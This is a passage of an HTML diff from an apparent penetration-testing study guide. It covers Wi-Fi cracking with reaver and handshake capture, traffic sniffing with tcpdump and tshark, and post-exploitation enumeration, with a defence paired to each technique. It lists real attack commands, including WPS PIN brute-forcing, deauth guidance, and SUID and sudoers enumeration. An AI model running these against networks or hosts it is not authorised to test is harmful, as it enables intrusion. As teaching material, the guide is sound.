+<li><strong>WPS</strong>: <code>wash -i wlan0mon</code> to find WPS APs; <code>reaver -i wlan0mon -b &lt;AP&gt; -c &lt;ch&gt; -vv</code> (online PIN), <code>-K 1</code> Pixie-Dust (offline).</li>
+<li>Success = passphrase in your wordlist. Long random passphrase / WPA3-SAE &rarr; offline attack fails.</li>
+<li><strong>Defence</strong>: 20+ char / multi-word PSK or 802.1X; WPA3; disable WPS; WLAN segmentation + client isolation; WIDS/WIPS for deauth/rogue-AP/WPS alerts.</li>
+</ul>
+</div></details>
+
+<details class="section"><summary>Q&amp;A</summary><div class="section-body">
+<dl class="qa">
+<dt>Why do you need to capture the 4-way handshake to crack WPA2-PSK, and why send a deauth?</dt>
+<dd>WPA2-PSK derives the session keys from the passphrase (via PBKDF2) plus nonces exchanged in the 4-way handshake. Capturing that handshake gives you the values needed to test passphrase guesses offline &mdash; without it there's nothing to check guesses against. The handshake only occurs when a client <em>joins</em> the network, so if all clients are already connected you send a <strong>deauth</strong> frame to knock one off; it reconnects automatically and you capture the handshake. (Alternatively, PMKID capture can sometimes get crackable material from the AP without any client.)</dd>
+<dt>After capturing the handshake, does the strength of the network matter, or is it already game over?</dt>
+<dd>It matters completely &mdash; capturing the handshake is not the crack. From there it's a pure offline dictionary/mask attack against PBKDF2. If the passphrase is <code>password123</code> or an 8-digit ISP default, it falls quickly. If it's 20 random characters or a 5-word passphrase, it is not in any wordlist and the keyspace is far too large to brute-force &mdash; the attack fails. So a strong PSK makes a captured handshake worthless.</dd>
+<dt>What flaw does reaver exploit, and how do you shut it down?</dt>
+<dd>WPS PIN authentication. The 8-digit PIN is checked in two 4-digit halves and the last digit is a checksum, so the effective space is only ~11,000 PINs &mdash; an online brute-force recovers it (and then the WPA passphrase the AP hands back) in hours on a router without lockout. Pixie-Dust is an offline variant against routers with weak randomness in the WPS exchange. Shut it down by <strong>disabling WPS entirely</strong> on the AP; if the firmware only offers "PIN off, push-button on", that's better but push-button has had issues too &mdash; off is best. Routers with WPS lockout after N failed PINs mitigate but don't eliminate it.</dd>
+<dt>How does WPA3 change this attack?</dt>
+<dd>WPA3-Personal replaces the PSK handshake with <strong>SAE (Simultaneous Authentication of Equals / "Dragonfly")</strong>, a password-authenticated key exchange. Capturing the handshake no longer lets you run an offline dictionary attack &mdash; each guess requires a fresh interaction with the AP or client, turning it back into a slow, detectable <em>online</em> attack. WPA3 also gives forward secrecy (a later passphrase compromise doesn't decrypt past captured traffic) and protected management frames (mitigating deauth). Caveat: "transitional" WPA3/WPA2 mode still lets a WPA2 client do a WPA2 handshake, so an attacker can downgrade; use WPA3-only SSIDs where your client base supports it.</dd>
+<dt>Is it legal to run a deauth against your own home network to test it?</dt>
+<dd>"Your own network" helps but isn't a blanket yes. Many countries regulate intentional RF interference/jamming, and a deauth flood is arguably that, in shared/unlicensed spectrum &mdash; some regulators (and the relevant statutes) don't carve out an exception for your own equipment if it can affect others' devices or spectrum. If neighbours' devices are on the same channel they can be hit too. Safe practice: test in an RF-shielded enclosure or a Faraday bag, use minimal deauth bursts, prefer passive capture / PMKID or just waiting for a natural handshake, and check your local telecom regulations. In a professional engagement, wireless testing scope and methods are spelled out in the RoE for exactly this reason.</dd>
+</dl>
+</div></details>
+
+<details class="section"><summary>Interview Questions</summary><div class="section-body">
+<div class="qlevel">
+<h4>Basic <span class="lvl-tag">warm-up</span></h4>
+<details class="answer-reveal"><summary>What does "monitor mode" do and why is it needed?</summary><div class="answer-box">
+It makes the Wi-Fi card capture <em>all</em> 802.11 frames on a channel, not just those addressed to it &mdash; needed to see beacons, other clients, and to capture the WPA handshake. Set it with <code>airmon-ng start wlan0</code>.
+</div></details>
+<details class="answer-reveal"><summary>Once you've captured a WPA2 handshake, what determines whether you can crack it?</summary><div class="answer-box">
+Whether the passphrase is in your wordlist (or matches your mask). It's a pure offline dictionary/mask attack from that point &mdash; a long, random passphrase can't be cracked this way.
+</div></details>
+</div>
+<div class="qlevel">
+<h4>Intermediate <span class="lvl-tag">core</span></h4>
+<details class="answer-reveal"><summary>You're doing an authorised wireless assessment of a corporate office. Outline your methodology and the report's key findings structure.</summary><div class="answer-box">
+<strong>Scope &amp; safety</strong>: confirm SSIDs in scope, allowed techniques (is deauth permitted?), hours, and that a client-DoS during deauth is acceptable; use a dedicated monitor-capable adapter; note that testing may briefly disrupt users. <strong>Passive recon</strong>: <code>airodump-ng</code> survey &mdash; enumerate SSIDs, BSSIDs, channels, encryption (open / WEP / WPA2-PSK / WPA2-Enterprise / WPA3), hidden SSIDs, WPS status (<code>wash</code>), signal reach outside the building (parking-lot test), and rogue/unexpected APs. <strong>PSK networks</strong>: capture a handshake (wait, or a scoped targeted deauth of one test client) or PMKID; run a <em>time-boxed</em> offline crack with a good wordlist + rules + policy masks &mdash; report whether it cracked and how fast, not just yes/no. <strong>WPS</strong>: for any AP with WPS on and unlocked, note the exposure (and, if in scope, demonstrate with reaver/Pixie-Dust briefly). <strong>Enterprise (802.1X)</strong>: check EAP method, whether certificate validation is enforced on clients (if not, an evil-twin + <code>hostapd-wpe</code>/EAP relay can harvest creds &mdash; test only if authorised), and whether the RADIUS/NPS config is hardened. <strong>Segmentation</strong>: from a connected guest/BYOD SSID, test isolation &mdash; can you reach the corporate LAN, management VLANs, other clients? Client isolation on? <strong>Rogue/evil-twin</strong>: is there detection (WIPS) for a spoofed corporate SSID? <strong>Report structure</strong>: executive summary (overall wireless posture, top risks); findings each with severity, evidence, affected SSID/AP, and remediation &mdash; e.g. "Guest SSID not isolated from corporate VLAN (High)", "WPA2-PSK with a crackable passphrase, recovered in 12 min (High)", "WPS enabled and unlocked on 6 APs (Medium)", "Corporate SSID reaches 40m into the public car park (Low/Info)", "No client-side certificate validation on 802.1X (High)"; and a prioritised roadmap (WPA3 migration, disable WPS, VLAN/isolation fixes, WIPS, passphrase/cert policy).</dd>
+</div></details>
+</div>
+<div class="qlevel">
+<h4>Advanced <span class="lvl-tag">deep</span></h4>
+<details class="answer-reveal"><summary>Design a secure enterprise wireless architecture that makes aircrack-ng, reaver, and evil-twin attacks ineffective, with monitoring.</summary><div class="answer-box">
+<strong>Authentication</strong>: WPA3-Enterprise with <strong>EAP-TLS</strong> (mutual certificates) &mdash; no shared PSK to crack, no password to phish; devices enrolled via MDM/SCEP with client certs, RADIUS (NPS/ISE/FreeRADIUS) validating the client cert chain and the clients configured to validate the RADIUS server cert and pinned CN/CA (this is what defeats evil-twin/<code>hostapd-wpe</code> credential harvesting &mdash; without server-cert validation, EAP is phishable). WPA3-only SSIDs where the fleet supports it; a separate, tightly-scoped transitional or legacy SSID only for devices that truly can't do WPA3/EAP-TLS, on an isolated VLAN with extra monitoring. Enable <strong>Protected Management Frames (802.11w)</strong> everywhere &mdash; mitigates deauth/disassoc floods. <strong>No WPS</strong> anywhere; enforce via the controller config and audit for it. <strong>Segmentation</strong>: role-based VLAN/SGT assignment from RADIUS (employee / BYOD / IoT / guest), each isolated; client isolation on guest and IoT; guest SSID egress-only to the internet through a filtering proxy, no route to internal; IoT SSID default-deny with per-device allow-lists; wireless management plane (controller, AP mgmt) on a dedicated wired VLAN unreachable from any SSID. <strong>PSK where unavoidable</strong> (IoT that can't do EAP): long random per-SSID passphrase or, better, <strong>WPA3-SAE</strong> (offline-attack resistant) or Private PSK / iPSK (per-device keys) so one leaked key isn't the whole network; rotate; keep those devices on the locked-down IoT VLAN. <strong>RF hygiene</strong>: minimise coverage bleed outside the premises (power tuning, directional antennas at the perimeter), disable legacy low rates. <strong>Monitoring (WIDS/WIPS)</strong>: dedicated sensors or AP scanning to alert on &mdash; rogue APs and <strong>evil twins</strong> (same SSID, different BSSID/vendor/cert), deauth/disassoc floods, WPS activity, karma/known-beacon attacks, unusual association patterns, and clients probing for corporate SSIDs off-site; auto-containment optional but tune carefully (containment is itself a deauth &mdash; legal/operational care). Feed alerts to the SOC, correlate with RADIUS auth logs (failed EAP, cert errors, impossible roaming). <strong>Endpoint side</strong>: MDM enforces the Wi-Fi profile (no manual SSID config, server-cert validation locked on, no "connect to open networks"), disables Wi-Fi Sense-style features, and removes saved open/PSK profiles. <strong>Validation</strong>: periodic authorised wireless assessments and continuous WIPS coverage checks; test that an evil-twin genuinely fails (client rejects the bad server cert) and that guest&rarr;corp isolation holds. Net: certificate-based WPA3-Enterprise with enforced mutual validation (no crackable/phishable secret), 802.11w against deauth, no WPS, strict role-based segmentation, per-device keys for the PSK-only stragglers, and WIDS/WIPS + RADIUS-log correlation so the attacks these tools perform either don't work or are detected immediately.</dd>
+</div></details>
+</div>
+</div></details>
+
+</div></div>
+</section>
+<!-- /TOPIC:pentest:wireless -->
+
+<!-- TOPIC:pentest:sniffing -->
+<section class="view topic" id="v-pentest-sniffing" data-skill="pentest">
+<div class="layout">
+<nav class="sidebar" data-sidebar="pentest"></nav>
+<div class="topic-body">
+<h1>Sniffing &amp; Traffic Analysis: tcpdump &amp; tshark</h1>
+<p class="subtitle">Capture packets off the wire with a BPF filter, save to pcap, then slice and analyse &mdash; the same skill for debugging an outage and for understanding traffic during an authorised assessment.</p>
+
+<details class="section" open><summary>Notes</summary><div class="section-body">
+<figure class="diagram">
+<svg viewBox="0 0 520 150" role="img" aria-labelledby="d-pt-sniff-t">
+<title id="d-pt-sniff-t">NIC to kernel capture (BPF) to pcap file to analysis with tcpdump / tshark / Wireshark</title>
+<rect class="d-box-alt" x="14" y="30" width="80" height="24" rx="4"/><text class="d-t-sm" x="54" y="46" text-anchor="middle">NIC</text>
+<rect class="d-box" x="120" y="26" width="120" height="32" rx="4"/><text class="d-t-sm" x="180" y="40" text-anchor="middle">kernel capture</text><text class="d-t-sm" x="180" y="53" text-anchor="middle">BPF filter (early)</text>
+<rect class="d-box-soft" x="270" y="30" width="90" height="24" rx="4"/><text class="d-t-sm" x="315" y="46" text-anchor="middle">.pcap(ng)</text>
+<rect class="d-box" x="390" y="14" width="120" height="16"/><text class="d-t-sm" x="396" y="26">tcpdump (quick)</text>
+<rect class="d-box" x="390" y="32" width="120" height="16"/><text class="d-t-sm" x="396" y="44">tshark (filters/-z)</text>
+<rect class="d-box" x="390" y="50" width="120" height="16"/><text class="d-t-sm" x="396" y="62">Wireshark (GUI)</text>
+<path class="d-line" d="M94 42 L118 42" marker-end="url(#pt-sniff-ah)"/><path class="d-line" d="M240 42 L268 42" marker-end="url(#pt-sniff-ah)"/><path class="d-line" d="M360 42 L388 38" marker-end="url(#pt-sniff-ah)"/>
+<defs><marker id="pt-sniff-ah" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path class="d-fill" d="M0 0 L8 4 L0 8 Z"/></marker></defs>
+<text class="d-t-sm" x="14" y="94"><tspan class="d-t-b">Capture filter (BPF)</tspan> is applied in the kernel &mdash; cheap, but can't be changed after capture. <tspan class="d-t-b">Display filter</tspan> (Wireshark/tshark <tspan class="d-t-mono">-Y</tspan>) is post-capture &mdash; rich, re-runnable.</text>
+<text class="d-t-sm" x="14" y="114">You only see traffic that reaches your NIC: your own host, or a <tspan class="d-t-b">SPAN port / TAP / hub</tspan>, or as MITM. Switches don't flood by default.</text>
+<text class="d-t-sm" x="14" y="132">On-path capture of others' traffic needs authorisation. TLS payloads stay encrypted unless you have keys (SSLKEYLOGFILE) or terminate TLS.</text>
+</svg>
+<figcaption>tcpdump for a fast look on any box; tshark when you want Wireshark's dissectors and statistics from the CLI or a script; Wireshark GUI for deep interactive analysis of the saved pcap.</figcaption>
+</figure>
+
+<h3>tcpdump &mdash; capture with a BPF filter</h3>
+<p><strong>What / why.</strong> The ubiquitous CLI sniffer. The filter expression is <strong>BPF</strong> (Berkeley Packet Filter), compiled and applied in the kernel so unmatched packets are dropped cheaply. Write to a pcap for real analysis; the terminal view is for a quick glance.</p>
+<pre>$ sudo tcpdump -D                                   # list capture interfaces
+$ sudo tcpdump -i eth0 -nn -v host 10.0.0.5 and port 443
+#   -i iface   -nn no name/port resolution   -v/-vv/-vvv verbosity   -e link-layer hdr   -X hex+ascii   -A ascii
+
+# save to a rotating capture (don't fill the disk):
+$ sudo tcpdump -i eth0 -w cap-%Y%m%d-%H%M%S.pcap -G 3600 -C 100 -W 24 -Z root 'tcp port 80 or tcp port 443'
+#   -w file   -G seconds (time rotate)   -C MB (size rotate)   -W keep N files   -s 0 full packet (default now)
+
+# read + re-filter a saved file:
+$ tcpdump -r cap.pcap -nn 'tcp[tcpflags] &amp; (tcp-syn) != 0 and tcp[tcpflags] &amp; (tcp-ack) == 0'   # bare SYNs
+
+# common BPF idioms:
+#   host H   src/dst host H   net 10.0.0.0/24   port P   portrange 1000-2000
+#   tcp / udp / icmp / arp     vlan 100     ether host AA:BB:..
+#   'tcp[13] &amp; 2 != 0'  (SYN set)     'icmp[icmptype] == icmp-echoreq'
+#   not port 22   (exclude your own ssh session so the capture isn't recursive)</pre>
+
+<h3>tshark &mdash; Wireshark on the command line</h3>
+<p><strong>What / why.</strong> Wireshark's engine without the GUI: the same protocol dissectors, <strong>display filters</strong> (<code>-Y</code>), field extraction (<code>-T fields -e ...</code>), and the <code>-z</code> statistics that answer "who talked to whom, how much, how slow".</p>
+<pre>$ tshark -D ; tshark -i eth0 -f 'tcp port 443' -w cap.pcapng    # -f = capture (BPF) filter
+$ tshark -r cap.pcapng -Y 'http.request' -T fields -e ip.src -e http.host -e http.request.uri
+$ tshark -r cap.pcapng -Y 'dns' -T fields -e dns.qry.name -e dns.a | sort | uniq -c | sort -rn
+$ tshark -r cap.pcapng -q -z conv,tcp                 # TCP conversations (bytes, packets, duration)
+$ tshark -r cap.pcapng -q -z io,stat,1                # throughput per second
+$ tshark -r cap.pcapng -q -z endpoints,ip             # per-IP totals
+$ tshark -r cap.pcapng -q -z http,tree                # HTTP request/response breakdown
+$ tshark -r cap.pcapng -Y 'tcp.analysis.retransmission or tcp.analysis.zero_window'   # trouble
+$ tshark -r cap.pcapng -z follow,tcp,ascii,3          # reassemble stream #3
+# display-filter examples: ip.addr==10.0.0.5 &amp;&amp; tcp.port==443 ; http.response.code>=500 ;
+#   tls.handshake.type==1 (ClientHello) ; frame contains "password" ; tcp.flags.syn==1 &amp;&amp; tcp.flags.ack==0</pre>
+
+<h3>Capture vs display filters, and getting the packets at all</h3>
+<ul>
+<li><strong>Capture filter</strong> (tcpdump expr, tshark/dumpcap <code>-f</code>) is BPF, applied in-kernel <em>before</em> capture &mdash; keeps volume down but you can't recover what you filtered out. Use it to bound a long capture (host/port/protocol).</li>
+<li><strong>Display filter</strong> (Wireshark, tshark <code>-Y</code>) runs <em>after</em> capture on the dissected packets &mdash; far more expressive (any protocol field, comparisons, <code>contains</code>, <code>matches</code>), and you can change it repeatedly on the same pcap.</li>
+<li><strong>Seeing the traffic</strong>: you only capture what hits your NIC. For traffic between other hosts you need a <strong>switch SPAN/mirror port</strong>, a physical <strong>network TAP</strong>, an old hub, or to be on-path (a gateway, a proxy, or &mdash; in an authorised test &mdash; an ARP/MITM position). Wireless needs monitor mode (see the Wi-Fi topic).</li>
+<li><strong>Encryption</strong>: TLS/SSH payloads stay opaque. You can still see SNI (usually), cert details, timing, sizes, and endpoints. To read payloads you need the session keys (<code>SSLKEYLOGFILE</code> from a browser/curl you control) or a TLS-terminating proxy &mdash; only for endpoints you own/are authorised to intercept.</li>
+</ul>
+
+<h3>Where this is used &mdash; and the defensive side</h3>
+<ul>
+<li><strong>Offensive / assessment</strong>: understanding protocols and data flows on an authorised engagement, catching credentials sent in cleartext (finding: "app uses HTTP Basic over plain HTTP"), confirming a MITM position works, extracting artefacts from a provided pcap in a CTF/DFIR exercise.</li>
+<li><strong>Defensive / ops</strong> (the bigger use): diagnosing latency/retransmits/resets, confirming a firewall rule, seeing what a mystery process talks to, malware C2 analysis from a pcap, and feeding IDS (Suricata/Zeek consume the same traffic).</li>
+<li><strong>Countering hostile sniffing</strong>: encrypt everything in transit (TLS 1.2+/1.3, SSH, IPsec/WireGuard, mTLS between services); switched networks with port security and dynamic ARP inspection / DHCP snooping to stop ARP-spoof MITM; 802.1X/NAC so an attacker can't just plug in; disable unused ports; segment; and monitor for NICs in promiscuous mode and for ARP anomalies.</li>
+<li><strong>Legal</strong>: capturing traffic you're not a party to, without authorisation, can be unlawful interception. Capture your own host freely; capture a network only with the owner's sign-off.</li>
+</ul>
+</div></details>
+
+<details class="section"><summary>Cheat Sheet</summary><div class="section-body">
+<ul>
+<li><strong>tcpdump</strong>: <code>tcpdump -i eth0 -nn -v &lt;bpf&gt;</code>; save <code>-w file</code>; rotate <code>-G secs -C MB -W count</code>; read <code>-r file</code>; <code>-A</code>/<code>-X</code> for payload; exclude your SSH with <code>not port 22</code>.</li>
+<li>BPF: <code>host</code>/<code>src</code>/<code>dst host</code>, <code>net CIDR</code>, <code>port</code>/<code>portrange</code>, <code>tcp</code>/<code>udp</code>/<code>icmp</code>/<code>arp</code>, <code>vlan</code>, flag tests (<code>tcp[13] &amp; 2 != 0</code> = SYN).</li>
+<li><strong>tshark</strong>: <code>-f</code> capture (BPF) filter, <code>-Y</code> display filter, <code>-T fields -e f1 -e f2</code> extract, <code>-r</code> read, <code>-w</code> write.</li>
+<li>tshark stats: <code>-z conv,tcp</code>, <code>-z io,stat,1</code>, <code>-z endpoints,ip</code>, <code>-z http,tree</code>, <code>-z follow,tcp,ascii,N</code>.</li>
+<li>Display-filter examples: <code>ip.addr==X</code>, <code>http.response.code&gt;=500</code>, <code>tls.handshake.type==1</code>, <code>tcp.analysis.retransmission</code>, <code>frame contains "..."</code>.</li>
+<li>Capture filter = kernel/BPF, pre-capture, cheap, irreversible. Display filter = post-capture, rich, re-runnable.</li>
+<li>To see other hosts' traffic: SPAN/mirror port, TAP, hub, or on-path/MITM (authorised only). TLS payloads need keys (<code>SSLKEYLOGFILE</code>) or a terminating proxy.</li>
+<li>Defence: encrypt in transit everywhere; switched net + port security + DAI + DHCP snooping + 802.1X; segment; watch for promiscuous NICs and ARP spoofing. Unauthorised interception can be illegal.</li>
+</ul>
+</div></details>
+
+<details class="section"><summary>Q&amp;A</summary><div class="section-body">
+<dl class="qa">
+<dt>What's the difference between a capture filter and a display filter?</dt>
+<dd>A <strong>capture filter</strong> is a BPF expression compiled and run in the kernel <em>as packets arrive</em> &mdash; anything that doesn't match is never stored, so it keeps capture volume and CPU down, but you can't get filtered-out packets back. A <strong>display filter</strong> (Wireshark / <code>tshark -Y</code>) runs <em>after</em> capture against fully dissected packets, so it's far more expressive (any protocol field, string matching, comparisons) and you can change it as often as you like on the same file. Rule of thumb: capture filter to bound a long capture to the hosts/ports/protocol you care about; display filter to explore what you captured.</dd>
+<dt>You run tcpdump on a switch port and only see broadcast traffic plus your own, not the conversation between two other servers. Why?</dt>
+<dd>Switches forward unicast frames only to the port where the destination MAC lives &mdash; they don't flood every port like a hub. So your NIC never sees traffic between two other hosts. To capture it you need a <strong>SPAN/mirror port</strong> configured on the switch to copy those ports' traffic to yours, a physical <strong>network TAP</strong> inserted in the link, or to be on the traffic path (the default gateway, a proxy, or an authorised ARP-spoof/MITM position). Promiscuous mode on your NIC is necessary but not sufficient &mdash; the frames still have to arrive.</dd>
+<dt>Can you read HTTPS content from a packet capture?</dt>
+<dd>Not the payload, by default &mdash; it's encrypted under TLS. You <em>can</em> see: the TCP/IP endpoints, packet sizes and timing, the TLS handshake including the server certificate and usually the SNI hostname (unless Encrypted Client Hello is in use), and the negotiated version/cipher. To decrypt the payload you need the session secrets: set <code>SSLKEYLOGFILE</code> in a browser/curl <em>you control</em> and point Wireshark at it, or capture at a point where TLS is terminated (a reverse proxy you own). For third-party traffic you don't have keys for, the payload stays opaque &mdash; and intercepting it without authorisation would be unlawful anyway.</dd>
+<dt>Which tshark option gives you a quick "top talkers" view from a pcap?</dt>
+<dd><code>tshark -r cap.pcapng -q -z endpoints,ip</code> for per-IP byte/packet totals, or <code>-z conv,tcp</code> (or <code>conv,ip</code>) for conversations ranked by volume with duration. <code>-z io,stat,1</code> shows throughput over time. These are the CLI equivalents of Wireshark's Statistics &rarr; Conversations / Endpoints / IO Graph.</dd>
+<dt>How do you keep a long tcpdump capture from filling the disk?</dt>
+<dd>Use ring-buffer rotation: <code>-w cap-%Y%m%d-%H%M%S.pcap -G 3600</code> (new file every hour) and/or <code>-C 100</code> (new file every 100 MB), with <code>-W 24</code> to keep only the last 24 files (older ones are overwritten). Add a tight capture filter so you're only storing the traffic you need, drop <code>-s</code> to a snap length if you only need headers, and consider writing to a dedicated volume. Monitor free space and have the capture stop or alert before the disk is critical.</dd>
+</dl>
+</div></details>
+
+<details class="section"><summary>Interview Questions</summary><div class="section-body">
+<div class="qlevel">
+<h4>Basic <span class="lvl-tag">warm-up</span></h4>
+<details class="answer-reveal"><summary>What is BPF in the context of tcpdump?</summary><div class="answer-box">
+Berkeley Packet Filter &mdash; the filter language for <em>capture</em> filters. The expression (e.g. <code>tcp port 443 and host 10.0.0.5</code>) is compiled to bytecode and run in the kernel so non-matching packets are discarded before they reach the tool.
+</div></details>
+<details class="answer-reveal"><summary>Which flags save a capture to a file and read it back?</summary><div class="answer-box">
+<code>tcpdump -w file.pcap</code> to write, <code>tcpdump -r file.pcap</code> to read (and you can apply a new BPF filter on read). Same <code>-w</code>/<code>-r</code> in tshark/dumpcap.
+</div></details>
+</div>
+<div class="qlevel">
+<h4>Intermediate <span class="lvl-tag">core</span></h4>
+<details class="answer-reveal"><summary>You're given a 2 GB pcap from an incident and asked "what did the compromised host talk to, and was anything exfiltrated?". Walk through your tshark analysis.</summary><div class="answer-box">
+(1) <strong>Orient</strong>: <code>capinfos cap.pcapng</code> for time range, packet count, link type. <code>tshark -r cap -q -z endpoints,ip</code> and <code>-z conv,ip</code> &mdash; who did the host (say <code>10.0.0.5</code>) talk to, ranked by bytes, with direction and duration. Flag external IPs, especially high <em>outbound</em> byte counts. (2) <strong>Resolve destinations</strong>: <code>tshark -r cap -Y 'dns' -T fields -e dns.qry.name -e dns.a</code> to map IPs to names; look for DGA-looking domains, dynamic-DNS, newly-seen domains, and DNS with abnormally large TXT/NULL responses (DNS tunnelling). <code>-z io,stat,60,'COUNT(dns)dns'</code> for query-rate spikes. (3) <strong>C2 candidates</strong>: long-lived or beaconing connections &mdash; regular-interval small requests (<code>-z io,stat</code> per conversation, or export timestamps and look for fixed periods), connections to raw IPs on odd ports, TLS with self-signed or mismatched certs (<code>-Y 'tls.handshake.type==11'</code> and inspect the cert), HTTP with unusual User-Agents or URIs (<code>-Y 'http.request' -T fields -e http.host -e http.user_agent -e http.request.uri</code>). (4) <strong>Exfil</strong>: outbound transfers &mdash; large POST/PUT bodies (<code>-Y 'http.request.method=="POST"' -T fields -e http.content_length</code>), big uploads over FTP/SFTP/SMB, data-heavy DNS/ICMP (tunnelling), or steady large TLS flows to an unfamiliar endpoint; sum outbound bytes per external peer and compare to a baseline. Reassemble suspicious cleartext streams (<code>-z follow,tcp,ascii,N</code>) to see the actual content; for TLS you'll have sizes/timing only unless keys are available. (5) <strong>Lateral</strong>: internal-to-internal connections from the host on SMB/RDP/WinRM/SSH that are unusual for it. (6) <strong>Report</strong>: list of external contacts with classification (benign/unknown/malicious), the C2 indicator(s) and beacon interval, evidence of exfil (protocol, destination, approximate volume, timeframe), and IOCs (IPs, domains, JA3/certs, URIs) for blocking and threat hunting. Note what's inconclusive due to encryption.</dd>
+</div></details>
+</div>
+<div class="qlevel">
+<h4>Advanced <span class="lvl-tag">deep</span></h4>
+<details class="answer-reveal"><summary>Design a network-visibility architecture for a production environment: where to capture, how to store, how to keep it useful and lawful.</summary><div class="answer-box">
+<strong>Capture points</strong>: (1) <em>Perimeter</em> &mdash; TAPs (fail-open, or aggregating TAPs) on internet uplinks and DMZ links; (2) <em>Core / inter-VLAN</em> &mdash; SPAN or TAP on trunks between segments (east-west is where lateral movement hides); (3) <em>Data-centre top-of-rack</em> for server-to-server; (4) <em>Cloud</em> &mdash; VPC Traffic Mirroring / packet mirroring to sensors, plus flow logs everywhere as the always-on baseline; (5) <em>Host-level</em> &mdash; eBPF/agent-based flow + selective pcap on critical servers where you can't tap. Prefer TAPs over SPAN for fidelity (SPAN drops under load and reorders); use packet brokers to filter/dedupe/load-balance to the tools. <strong>What to run on the traffic</strong>: Zeek for connection/protocol logs (compact, queryable &mdash; the workhorse), Suricata for IDS/alerting, and a <strong>rolling full-packet capture</strong> (e.g. Arkime/Moloch, or Stenographer) with a retention window sized to budget (often 3&ndash;30 days) indexed by Zeek metadata so you can pivot from an alert to the packets. Flow logs / NetFlow kept much longer (months) for historical hunting. <strong>Storage</strong>: tiered &mdash; hot SSD for recent full pcap, cheaper disk/object for Zeek logs and flow, lifecycle policies; size for peak throughput &times; retention with headroom; compress; shard by sensor. <strong>Keeping it useful</strong>: normalise timestamps (PTP/NTP discipline on sensors), tag captures with sensor/segment, integrate with the SIEM so an alert links straight to the relevant Zeek session and pcap, maintain dissector/rule updates, and monitor the pipeline itself (drops at broker/sensor, disk, index lag). Decrypt where you legitimately can and it's worth it &mdash; TLS interception at the egress proxy for outbound (with clear policy and exclusions for banking/health/privacy categories), or key-log/keying material from your own servers for inbound &mdash; and accept metadata-only elsewhere; JA3/JA4 and cert fingerprints stay useful without decryption. <strong>Lawful &amp; ethical</strong>: written policy and authorisation covering employee-traffic monitoring (notice/consent per jurisdiction &mdash; works councils in the EU, etc.), documented purpose (security/ops, not surveillance), minimisation (capture filters that exclude out-of-scope or highly sensitive flows, drop payloads where only metadata is needed), strict RBAC and audit on who can query captures and decrypt, retention limits enforced technically, and legal review for cross-border data. <strong>Access</strong>: analysts get read-only search; raw pcap export and decryption are privileged, logged actions. <strong>Validation</strong>: periodically test that a synthetic event is visible end-to-end (sensor &rarr; Zeek &rarr; SIEM &rarr; pcab retrievable), and that retention/rotation actually work. Net: TAP-first capture at perimeter + core + cloud-mirror, Zeek+Suricata+rolling full-packet with metadata indexing, tiered retention with long-lived flow logs, SIEM integration for alert-to-packet pivot, selective lawful decryption at controlled points, and a governance layer (authorisation, minimisation, RBAC, retention, audit) so the visibility is both effective and defensible.</dd>
+</div></details>
+</div>
+</div></details>
+
+</div></div>
+</section>
+<!-- /TOPIC:pentest:sniffing -->
+
+<!-- TOPIC:pentest:post-exploitation -->
+<section class="view topic" id="v-pentest-post-exploitation" data-skill="pentest">
+<div class="layout">
+<nav class="sidebar" data-sidebar="pentest"></nav>
+<div class="topic-body">
+<h1>Post-Exploitation Enumeration</h1>
+<p class="subtitle">You have a shell on an authorised target. Before anything else, answer: <em>who am I, what can I do, what is this box, what can it reach</em> &mdash; using built-in commands, quietly. Every enumeration step has a hardening mirror.</p>
+
+<details class="section" open><summary>Notes</summary><div class="section-body">
+<figure class="diagram">
+<svg viewBox="0 0 520 150" role="img" aria-labelledby="d-pt-post-t">
+<title id="d-pt-post-t">Enumeration order: identity, privileges, system, network, credentials, then decide</title>
+<rect class="d-box-alt" x="8" y="24" width="86" height="24" rx="4"/><text class="d-t-sm" x="51" y="40" text-anchor="middle">who / id</text>
+<rect class="d-box" x="102" y="24" width="92" height="24" rx="4"/><text class="d-t-sm" x="148" y="40" text-anchor="middle">sudo -l / caps</text>
+<rect class="d-box" x="202" y="24" width="92" height="24" rx="4"/><text class="d-t-sm" x="248" y="40" text-anchor="middle">uname / OS</text>
+<rect class="d-box" x="302" y="24" width="96" height="24" rx="4"/><text class="d-t-sm" x="350" y="40" text-anchor="middle">ss / lsof -i</text>
+<rect class="d-box" x="406" y="24" width="96" height="24" rx="4"/><text class="d-t-sm" x="454" y="40" text-anchor="middle">creds / files</text>
+<path class="d-line" d="M94 36 L100 36" marker-end="url(#pt-post-ah)"/><path class="d-line" d="M194 36 L200 36" marker-end="url(#pt-post-ah)"/>
+<path class="d-line" d="M294 36 L300 36" marker-end="url(#pt-post-ah)"/><path class="d-line" d="M398 36 L404 36" marker-end="url(#pt-post-ah)"/>
+<defs><marker id="pt-post-ah" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path class="d-fill" d="M0 0 L8 4 L0 8 Z"/></marker></defs>
+<text class="d-t-sm" x="8" y="88">Prefer <tspan class="d-t-b">built-in</tspan> commands (no uploads, less noise). Automated scripts (linpeas/winpeas) are faster but loud &mdash; use per the RoE.</text>
+<text class="d-t-sm" x="8" y="108">Goal of enumeration = find the <tspan class="d-t-b">privilege-escalation</tspan> path and the <tspan class="d-t-b">lateral-movement</tspan> path &mdash; then decide, in scope.</text>
+<text class="d-t-sm" x="8" y="128">Defender's read: every one of these commands, run by an unexpected process/user, is a detection opportunity.</text>
+</svg>
+<figcaption>These are ordinary Linux administration commands &mdash; which is exactly why they're used post-exploitation (they're always present and rarely alerted on). The defensive job is to make the answers boring: least privilege, patched kernel, no stray credentials, segmented network.</figcaption>
+</figure>
+
+<h3>Identity &amp; privileges &mdash; what can this account do?</h3>
+<p><strong>What / why.</strong> First question after landing a shell. Am I root already? If not, what's my direct path up &mdash; sudo rights, group memberships (<code>docker</code>, <code>lxd</code>, <code>disk</code>, <code>adm</code>, <code>sudo</code>/<code>wheel</code> are all escalation-relevant), file capabilities, or a SUID binary.</p>
+<pre>$ whoami ; id                       # user, UID, GID, and supplementary groups (root = UID 0)
+$ id -u ; groups                    # quick checks; group 'docker'/'lxd' often == root-equivalent
+$ sudo -l                           # what may I run via sudo, and as whom, with/without a password
+$ sudo -n true 2>&amp;1                 # can I sudo without a password prompt?
+$ getcap -r / 2>/dev/null           # file capabilities (cap_setuid+ep on a binary = privesc)
+$ find / -perm -4000 -type f 2>/dev/null      # SUID binaries (compare against GTFOBins)
+$ find / -perm -2000 -type f 2>/dev/null      # SGID
+$ cat /etc/sudoers /etc/sudoers.d/* 2>/dev/null
+# defensive mirror: minimal sudo rules (no NOPASSWD, no wildcards, no shell-outs), audit group
